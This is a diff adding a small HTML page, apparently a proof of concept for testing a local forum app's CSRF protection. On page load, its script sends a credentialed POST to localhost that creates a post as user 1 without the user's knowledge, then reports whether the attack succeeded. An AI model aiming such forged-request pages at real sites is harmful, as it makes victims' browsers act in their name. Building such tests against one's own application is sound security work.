@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Attack in progress...</h1>
+    <script>
+      fetch("http://localhost:8080/api/posts", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          title: "CSRF attack",
+          content: "This post was created without the user's knowledge.",
+          idUser: 1,
+          idThread: 1
+        }),
+        credentials: "include"
+      }).then(r => {
+        if (r.ok) alert("Attack was successful");
+        else alert("Failed: " + r.status);
+      });
+    </script>
+  </body>
+</html>
+
